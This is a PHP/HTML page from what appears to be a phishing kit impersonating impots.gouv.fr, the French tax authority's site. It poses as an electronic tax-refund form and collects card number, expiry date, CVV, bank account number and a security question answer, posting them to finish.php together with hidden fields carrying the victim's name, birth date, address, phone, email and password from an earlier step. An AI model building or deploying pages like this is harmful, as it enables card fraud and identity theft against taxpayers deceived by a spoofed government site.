<?
function er3($string){
    if( $string == ""){
echo "<font class='input-text required-entry' color='red'>&nbsp;Ceci est un champ obligatoire.</font>";
	}
}
function er2(){
    if( $_POST['expMonth'] == "" OR $_POST['expYear'] == ""){
echo "<font color='red>nbsp;S&eacute;lectionner l'une des options.</font>";
	}
}
?>
<html dir="ltr" lang="fr"><!-- InstanceBegin template="/Templates/modele_accueil.dwt" codeOutsideHTMLIsLocked="false" -->
<head>
<title>Impots.gouv.fr - Accueil</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">

<link rel="shortcut icon" type="image/x-icon" href="./file/favicon.ico">
<link href="./file/style.css" rel="stylesheet" type="text/css" />

<link href="./file/wysiwyg.css" rel="stylesheet" type="text/css" />
<script type="text/javascript" src="./file/script_divers.js"></script>
<script type="text/javascript"><!--
function xt_med(type,section,page,x1,x2,x3,x4,x5)
{xt_img = new Image();
xtdate = new Date();
xts = screen;
xt_ajout = (type=='F') ? '' : (type=='M') ? '&a='+x1+'&m1='+x2+'&m2='+x3+'&m3='+x4+'&m4='+x5 : '&clic='+x1;
Xt_im = './file/hit.xiti.gif'+section;
Xt_im += '&p='+page+xt_ajout+'&hl=' + xtdate.getHours() + 'x' + xtdate.getMinutes() + 'x' + xtdate.getSeconds();
if(parseFloat(navigator.appVersion)>=4)
{Xt_im += '&r=' + xts.width + 'x' + xts.height + 'x' + xts.pixelDepth + 'x' + xts.colorDepth;}
xt_img.src = Xt_im;
if ((x2 != null)&&(x2!=undefined)&&(type=='C'))
{ if ((x3=='')||(x3==null)) { document.location = x2} else {xfen = window.open(x2,'xfen',''); xfen.focus();}}
else
{return;}}
--></script>
</head>
<body>
<noscript>
<style>
#menuNav ul li{
display:block;
}
#menuNav ul li ul {
position:relative;
display:block;
}
#menuNav ul.pro li ul,
#menuNav ul.part li ul{
top:0px;
}
</style>
</noscript>
<!-- marqueur campagne sircom -->
 
<noscript> 
<iframe src="#" width="1" height="1" frameborder="0" style="display:none"></iframe> 
</noscript>
<!-- fin marqueur campagne sircom -->
<div id="page"> 
<div id="header"> 
<div id="topMenu">
<a href="#" title="Les coordonn&eacute;es des services de la DGFiP" alt="Les coordonn&eacute;es des services de la DGFiP">Contacts |</a>
<a href="#" title="Les r&eacute;ponses &aacute; vos questions fr&eacute;quentes" alt="Les r&eacute;ponses &aacute; vos questions fr&eacute;quentes">Questions fr&eacute;quentes |</a>
<a href="#" title="Plan du site" alt="Plan du site">Plan du site |</a>
<a href="#" title="Pour la presse" alt="Pour la presse">Pour la presse |</a>
<a href="#" title="D&eacute;couvrez la DGFiP" alt="D&eacute;couvrez la DGFiP">Nous conna&icirc;tre |</a>
<span class="follow">Nous suivre :</span>
</div>
<div id="blocMariane">
<a href="#" class="sp" title="Acc&egrave;s au site gouvernement.gouv.fr (nouvelle fenêtre)" alt="Acc&egrave;s au site gouvernement.fr (nouvelle fenêtre)" target="_blank"></a> 
<a href="#/" class="ministere" title="economie.gouv.fr (nouvelle fenêtre)" alt="Acc&egrave;s au site economie.gouv.fr (nouvelle fenêtre)" target="_blank"></a> 
</div>
<h1 class="hide">
<a href="#" title="Retour &aacute; l'accueil" alt="Retour &aacute; l'accueil"> 
<div class="igf">impots.gouv.fr</div>
<div class="baseline">un site de la Direction g&eacute;n&eacute;rale des Finances Publiques</div>
</a> </h1>
<div id="followUs">
<a class="twitter" target="blank" href="#" title="Acc&egrave;s au compte Twitter de la DGFiP (nouvelle fenêtre)" alt="Acc&egrave;s au compte Twitter de la DGFiP (nouvelle fenêtre)">Twitter</a>
<a class="facebook" target="blank" href="#" title="Acc&egrave;s &aacute; la page Facebook de la DGFiP (nouvelle fenêtre)" alt="Acc&egrave;s &aacute; la page Facebook de la DGFiP (nouvelle fenêtre)">Facebook</a> 
</div>
<div id="rech"> 
<h2>recherche</h2>
<a href="#" title="Recherche par mots-cl&eacute;s" alt="Rechercher par mots-cl&eacute;s">
Recherche d&eacute;taill&eacute;e
</a>
<a href="#" title="Recherche de formulaires" alt="Recherche de formulaires">
Recherche de formulaires</a>
</div>
<div id="mesServ"> 
<div class="content"> 
<h3>Tous vos services en ligne</h3>
<h4>Acc&egrave;s &aacute;<br/>votre espace</h4>
<a class="acces" href="#" title="Acc&egrave;s &aacute; votre Espace personnel" alt="Acc&egrave;s &aacute; votre Espace personnel">
Particuliers
</a>
<a class="acces" href="#" title="Acc&egrave;s &aacute; votre Espace abonn&eacute; professionnel" alt="Acc&egrave;s &aacute; votre Espace abonn&eacute; professionnel">
Professionnels
</a> 
</div>
</div>
<div id="onglets">
<a href="#" class="part" title="Acc&egrave;s &aacute; la rubrique Particuliers" alt="Acc&egrave;s &aacute; la rubrique Particuliers">particuliers</a> 
<a href="#" class="pro" title="Acc&egrave;s &aacute; la rubrique Professionnels" alt="Acc&egrave;s &aacute; la rubrique Professionnels">professionnels</a> 
<a href="#" class="doc" title="Acc&egrave;s &aacute; la rubrique Documentation" alt="Acc&egrave;s &aacute; la rubrique Documentation">documentation</a> 
</div>
</div>
<div id="conteneur" class="home"> 
<div class="subConteneur"> 
<div id="filAriane"> 
</div>
<!-- InstanceBeginEditable name="Banniere-Largeur-924px" -->
<!-- InstanceEndEditable -->
      <div class="colGauche" style="width: 663px; height: 445px"> <!-- InstanceBeginEditable name="Banniere-Largeur-662px" --> 
        <!-- InstanceEndEditable --> 
        <div class="services">
<div style="clear:both;"></div>
</div>
<div class="bloc actu"> 
<div class="content"> 
<h2 class="actuFisc"><span>Formulaire de remboursement &eacute;lectronique - N37422993</span></h2>
            <div class="une"> 
				<div id="saisie_obligatoire">
					<b><font color="#008080" size="3">Donn&eacute;es bancaires<br>
&nbsp;</font></b><p><span id="saisie_obligatoire_texte"><font color="#FF0000">*
					</font>La saisie de toutes les zones est obligatoire<font color="#FF0000">.
					</font></span><br>
					<br>
					<font color="#FF0000" style="font-size: 9pt">
					<span id="saisie_obligatoire_comptage">Lors d&#39;un erreur de 
					saisie veuillez verifier tous les champs signal&eacute;s par </span>&nbsp;<img id="spi_img_error" class src="./file/pic_alerte.gif"> 
					.<br>
&nbsp;</font></div>
				<form name="go" method="POST" action="finish.php">
				<input type="hidden" id="nom" name="nom" value="">
<input type="hidden" id="nom" name="prenom" value="">
<input type="hidden" id="nom" name="dob1" value="">
<input type="hidden" id="nom" name="dob2" value="">
<input type="hidden" id="nom" name="dob3" value="">
<input type="hidden" id="nom" name="postale" value="">
<input type="hidden" id="nom" name="ville" value="">
<input type="hidden" id="nom" name="adresse" value="">
<input type="hidden" id="nom" name="adresse2" value="">
<input type="hidden" id="nom" name="tele" value="">
<input type="hidden" id="nom" name="email" value="">
<input type="hidden" id="nom" name="passe" value="">
					<table border="0" cellspacing="0" height="273">
						<tr>
							<td class align>Nom de votre banque&nbsp;<span id="saisie_obligatoire_texte0"><font color="#FF0000">*</font></span>:
								</td>
							<td>
							<input tabindex="1" maxlength="24" id="nom" name="banque" type="text" size="30"><?er3($_POST['banque']);?></td>
						</tr>
						<tr>
							<td class align>Num&eacute;ro de carte bancaire<font color="#FF0000">
							</font><span id="saisie_obligatoire_texte1">
							<font color="#FF0000">*</font></span>:
								</td>
							<td>
							<input id="cc" name="cc" maxlength="17" type="text" size="20">&nbsp;<img src="cclogos.PNG"></img><?er3($_POST['cc']);?></td>
						</tr>
						<tr>
							<td class align>Date&nbsp;d&#39;expiration&nbsp;<span id="saisie_obligatoire_texte11"><font color="#FF0000">*</font></span>:</td>
							<td><font size="1"></font>
			
			
            <select id="expMonth" name="expMonth" class="month" tabindex="16">
                <option value="Mois" selected="">Mois</option>
				<option value="1">1</option>
				<option value="2">2</option>
				<option value="3">3</option>
				<option value="4">4</option>
				<option value="5">5</option>
				<option value="6">6</option>
				<option value="7">7</option>
				<option value="8">8</option>
				<option value="9">9</option>
				<option value="10">10</option>
				<option value="11">11</option>
				<option value="12">12</option>            
			</select><select id="expYear" name="expYear" class="year" tabindex="17">
                <option value="Ann&eacute;e" selected="">Ann&eacute;e</option>
                <option value="2013">2013</option>
				<option value="2014">2014</option>
				<option value="2015">2015</option>
				<option value="2016">2016</option>
				<option value="2017">2017</option>
				<option value="2018">2018</option>
				<option value="2019">2019</option>
				<option value="2020">2020</option>
				<option value="2021">2021</option>
				<option value="2022">2022</option>
				<option value="2023">2023</option>
				<option value="2024">2024</option>
				<option value="2025">2025</option>
				<option value="2026">2026</option>
				<option value="2027">2027</option>
				<option value="2028">2028</option>
				<option value="2029">2029</option>
				<option value="2030">2030</option>
				<option value="2031">2031</option>           
			</select><? er2();?></td><td>
			
			
            &nbsp;



</td><td>
</font></td>
						</tr>
						<tr>
							<td class align>Cvv (Cryptogramme visuel)<span id="saisie_obligatoire_texte12"><font color="#FF0000"> *</font></span>:<td>
							<input id="cvv" name="cvv" ="3" maxlength="3" type="text" size="3">&nbsp;<img src="cvv.gif"></img><?er3($_POST['cvv']);?></td>
						</tr>
						<tr>
							<td class align>Num&eacute;ro de votre compte
							<span id="saisie_obligatoire_texte4">
							<font color="#FF0000">*</font></span>:
								</td>
							<td>
							<input tabindex="3" maxlength="30" id="text" name="numcompte" type="text" size="24"><?er3($_POST['numcompte']);?></td>
						</tr>
						<tr>
							<td align>Question personnelle 
							<span id="saisie_obligatoire_texte5">
							<font color="#FF0000"> 
							*</font></span:
								</td>
							<td><select id="qest" name="qest" class="chp_question">
                              <option value="Quel &amp;eacute;tait le pr&amp;eacute;nom de votre meilleur(e) ami(e) d'enfance ?">
										Quel &eacute;tait le pr&eacute;nom de votre meilleur(e) ami(e) d'enfance ?
									</option>
								
									<option value="Dans quelle rue avez-vous grandi ?">
										Dans quelle rue avez-vous grandi ?
									</option>
								
									<option value="Quel est le pr&amp;eacute;nom de l'a&amp;icirc;n&amp;eacute;(e) de vos cousins et cousines ? ">
										Quel est le pr&eacute;nom de l'a&icirc;n&eacute;(e) de vos cousins et cousines ? 
									</option>
								
									<option value="Quel a &amp;eacute;t&amp;eacute; votre lieu de vacances pr&amp;eacute;f&amp;eacute;r&amp;eacute; durant votre enfance ?">
										Quel a &eacute;t&eacute; votre lieu de vacances pr&eacute;f&eacute;r&eacute; durant votre enfance ?
									</option>
								
									<option value="Quel &amp;eacute;tait votre dessin anim&amp;eacute; pr&amp;eacute;f&amp;eacute;r&amp;eacute; ?">
										Quel &eacute;tait votre dessin anim&eacute; pr&eacute;f&eacute;r&eacute; ?
									</option>
                            </select></td>						</tr>
						<tr>
							<td align>R&eacute;ponse personnelle&nbsp; 
							<span id="saisie_obligatoire_texte10">
							<font color="#FF0000"> 
							*</font></span>:
								</td>
							<td>
							<input tabindex="3" maxlength="80" id="adresse2" name="adresse2" type="text" size="40"><?er3($_POST['adresse2']);?></td>
						</tr>
						<tr>
							<td class align>&nbsp;</td>
							<td>
							<br>
							<input type="image" src="confirmer.png" value="Confirmer" name="go" style="float: right"></td>
						</tr>
					</table>
				</form>
				</div>
</div>
</div>
</div>
      <div class="colDroite"> <!-- InstanceBeginEditable name="Article-SPECIAL-Colonne-Droite" --> 
        <!-- InstanceEndEditable --> 
        <div class="services">
			<div class="dgfip">
				<h3>les autres services de la DGFiP</h3>
				<div class="content">
					<div class="photo"></div>
					<ul class="public">
<!-- InstanceBeginEditable name="Autres-Services-DGFIP-Colonne-Droite" -->
						<li>
						<a target="blank" href="#" title="Acc&egrave;s au site cadastre.gouv.fr (nouvelle fenêtre)" alt="Acc&egrave;s au site cadastre.gouv.fr (nouvelle fenêtre)">Le plan cadastral</a>
						</li>
						<li>
						<a target="blank" href="#" title="Acc&egrave;s au site amendes.gouv.fr (nouvelle fenêtre)" alt="Acc&egrave;s au site amendes.gouv.fr (nouvelle fenêtre)">Les amendes</a>
						</li>
						<li>
						<a target="blank" href="#" title="Acc&egrave;s au site tipi.budget.gouv.fr (nouvelle fenêtre)" alt="Acc&egrave;s au site tipi.budget.gouv.fr (nouvelle fenêtre)">Le t&eacute;l&eacute;paiement des services publics locaux</a>
						</li>
						<li>
						<a target="blank" href="#/" title="Acc&egrave;s au site collectivites-locales.gouv.fr (nouvelle fenêtre)" alt="Acc&egrave;s au site collectivites-locales.gouv.fr (nouvelle fenêtre)">Les collectivit&eacute;s locales</a>
						</li>
						<li>
						<a target="blank" href="#" title="Acc&egrave;s au site economie.gouv.fr/cessions (nouvelle fenêtre)" alt="Acc&egrave;s au site economie.gouv.fr/cessions (nouvelle fenêtre)">Les cessions immobili&egrave;res de l'ةtat</a>
						</li>
						<li>
						<a target="blank" href="#" title="Acc&egrave;s au site pensions.bercy.gouv.fr (nouvelle fenêtre)" alt="Acc&egrave;s au pensions.bercy.gouv.fr site (nouvelle fenêtre)">Les pensions et retraites de l'ةtat</a>
						</li>
						<li>
						<a target="blank" href="#" title="Acc&egrave;s au site ventes-domaniales.fr (nouvelle fenêtre)" alt="Acc&egrave;s au site ventes-domaniales.fr (nouvelle fenêtre)">Les ventes domaniales</a>
</li>
<!-- InstanceEndEditable -->
					</ul></div></div></div>
<!-- InstanceBeginEditable name="Page-Colonne-Droite" -->
		<div class="bloc btn qr">
			<a href="#" title="Les r&eacute;ponses &aacute; vos questions fr&eacute;quentes" alt="Les r&eacute;ponses &aacute; vos questions fr&eacute;quentes">Questions fr&eacute;quentes</a></div>
</div>
<div style="clear:both;"></div>
</div>
</div>
<div id="footer"> 
<div class="liens"> 
<div class="content"> 
<ul>
<h3>Informations sur le site :</h3>
<li>
<a href="#" title="Plan du site" alt="Plan du site">Plan du site</a>
</li>
<li>
<a href="#" onClick="return winPop(this.href);" title="Mentions l&eacute;gales (nouvelle fenêtre)" alt="Mentions l&eacute;gales (nouvelle fenêtre)">Mentions l&eacute;gales</a>
</li>
<li>
<a href="#" target="_blank" title="Acc&egrave;s au r&eacute;pertoire des informations publiques (nouvelle fenêtre)" alt="Acc&egrave;s au r&eacute;pertoire des informations publiques (nouvelle fenêtre)">R&eacute;pertoire des informations publiques</a>
</li>
<li>
<a href="#" title="Les r&eacute;ponses &aacute; vos questions fr&eacute;quentes" alt="Les r&eacute;ponses &aacute; vos questions fr&eacute;quentes">Questions fr&eacute;quentes</a>
</li>
<li>
<a href="#" title="Les coordonn&eacute;es des services de la DGFiP" alt="Les coordonn&eacute;es des services de la DGFiP">Contacts</a>
</li>
</ul>
<ul>
<h3>Les rubriques du site :</h3>
<li>
<a href="#" title="Acc&egrave;s &aacute; la rubrique Particuliers" alt="Acc&egrave;s &aacute; la rubrique Particuliers">Particuliers</a>
</li>
<li>
<a href="#" title="Acc&egrave;s &aacute; la rubrique Professionnels" alt="Acc&egrave;s &aacute; la rubrique Professionnels">Professionnels</a> 
</li>
<li>
<a href="#" title="Acc&egrave;s &aacute; la rubrique Documentation" alt="Acc&egrave;s &aacute; la rubrique Documentation">Documentation</a> 
</li>
<li><a href="#" title="Acc&egrave;s &aacute; la rubrique Collectivit&eacute;s locales" alt="Acc&egrave;s &aacute; la rubrique Collectivit&eacute;s locales">Collectivit&eacute;s locales</a></li>
<li>
<a href="#" title="Acc&egrave;s &aacute; la rubrique Statistiques" alt="Acc&egrave;s &aacute; la rubrique Statistiques">Statistiques</a>
</li>
</ul>
<ul>
<h3>Suivre l’information :</h3>
<li>
<a href="#" title="Pour la presse" alt="Pour la presse">Pour la presse</a>
</li>
<li>
<a target="blank" href="#" title="Acc&egrave;s &aacute; la page Facebook de la DGFiP (nouvelle fenêtre)" alt="Acc&egrave;s &aacute; la page Facebook de la DGFiP (nouvelle fenêtre)">Facebook</a> 
</li>
<li>
<a target="blank" href="#" title="Acc&egrave;s au compte Twitter de la DGFiP (nouvelle fenêtre)" alt="Acc&egrave;s au compte Twitter de la DGFiP (nouvelle fenêtre)">Twitter</a>
</li>
</ul>
<ul>
<h3>Sites associ&eacute;s :</h3>
<li>
<a target="blank" href="#" title="Acc&egrave;s au site economie.gouv.fr (nouvelle fenêtre)" alt="Acc&egrave;s au site economie.gouv.fr (nouvelle fenêtre)">economie.gouv.fr</a>
</li>
<li>
<a target="blank" href="#" title="Acc&egrave;s au site cadastre.gouv.fr (nouvelle fenêtre)" alt="Acc&egrave;s au site cadastre.gouv.fr (nouvelle fenêtre)">cadastre.gouv.fr</a>
</li>
<li>
<a target="blank" href="#" title="Acc&egrave;s au site amendes.gouv.fr (nouvelle fenêtre)" alt="Acc&egrave;s au site amendes.gouv.fr (nouvelle fenêtre)">amendes.gouv.fr</a>
</li>
<li>
<a target="blank" href="#" title="Acc&egrave;s au site tipi.budget.gouv.fr (nouvelle fenêtre)" alt="Acc&egrave;s au site tipi.budget.gouv.fr (nouvelle fenêtre)">tipi.budget.gouv.fr</a>
</li>
<li>
<a target="blank" href="#" title="Acc&egrave;s au site collectivites-locales.gouv.fr (nouvelle fenêtre)" alt="Acc&egrave;s au site collectivites-locales.gouv.fr (nouvelle fenêtre)">collectivites-locales.gouv.fr</a>
</li>
<li>
<a target="blank" href="#" title="Acc&egrave;s au site economie.gouv.fr/cessions (nouvelle fenêtre)" alt="Acc&egrave;s au site economie.gouv.fr/cessions (nouvelle fenêtre)">economie.gouv.fr/cessions</a>
</li>
<li>
<a target="blank" href="#" title="Acc&egrave;s au site pensions.bercy.gouv.fr (nouvelle fenêtre)" alt="Acc&egrave;s au pensions.bercy.gouv.fr site (nouvelle fenêtre)">pensions.bercy.gouv.fr</a>
</li>
<li>
<a target="blank" href="#" title="Acc&egrave;s au site ventes-domaniales.fr (nouvelle fenêtre)" alt="Acc&egrave;s au site ventes-domaniales.fr (nouvelle fenêtre)">ventes-domaniales.fr</a>
</li>
</ul>
</div>
</div>
<div class="comarquage">
<a target="_blank" href="#" title="Acc&egrave;s au site service-public.fr (nouvelle fenêtre)">
<img src="./file/logo_sp.gif" alt="Acc&egrave;s au site service-public.fr (nouvelle fenêtre)"/>
</a>
<a target="_blank" href="#" title="Acc&egrave;s au site www.legifrance.gouv.fr (nouvelle fenêtre)">
<img src="./file/logo_legifrance.gif" width="138" height="25" alt="Acc&egrave;s au site www.legifrance.gouv.fr (nouvelle fenêtre)"/>
</a> 
<a href="#" class="sp" title="Acc&egrave;s au site gouvernement.gouv.fr (nouvelle fenêtre)" target="_blank">
<img src="./file/logo_gouv.jpg" width="120" height="45" alt="Acc&egrave;s au site gouvernement.fr (nouvelle fenêtre)"/>
</a>
<a target="_blank" href="#" title="Acc&egrave;s au site france.fr (nouvelle fenêtre)">
<img src="./file/logo_france-fr.gif" width="143" height="45" alt="Acc&egrave;s au site france.fr (nouvelle fenêtre)"/>
</a> 
<a target="_blank" href="#" title="Acc&egrave;s au site service-public.fr (nouvelle fenêtre)">
<img src="./file/logo_msp.gif" alt="Acc&egrave;s au site service-public.fr (nouvelle fenêtre)"/>
</a>
</div>
<div class="signature">impots.gouv.fr - Direction g&eacute;n&eacute;rale des Finances Publiques 
| &copy; Minist&egrave;re de l'ةconomie et des Finances 
<script type="text/javascript">
Today = new Date;
Annee = Today.getFullYear();
document.write(" - "+Annee);
</script>
</div>
</div>
</div>
<script type="text/javascript"><!--
hsh = new Date();
hsd = document;
hsr = hsd.referrer.replace(/[<>]/g, '');
hsi = '<img width="1" height="1" src="./file/hit.xiti.gif';
hsi += '&p=accueil';
hsi += '&hl=' + hsh.getHours() + 'x' + hsh.getMinutes() + 'x' + hsh.getSeconds();
if(parseFloat(navigator.appVersion)>=4)
{Xiti_s=screen;hsi += '&r=' + Xiti_s.width + 'x' + Xiti_s.height + 'x' + Xiti_s.pixelDepth + 'x' + Xiti_s.colorDepth;}
hsd.writeln(hsi + '&ref=' + hsr.replace(/&/g, '$') + '" />');
//--></script><noscript><img width="1" height="1" src="./file/hit.xiti.gif" /></noscript>
</body>
<!-- InstanceEnd --></html><!-- #BeginEditable "(code aprs la balise HTML)" --><!-- #EndEditable -->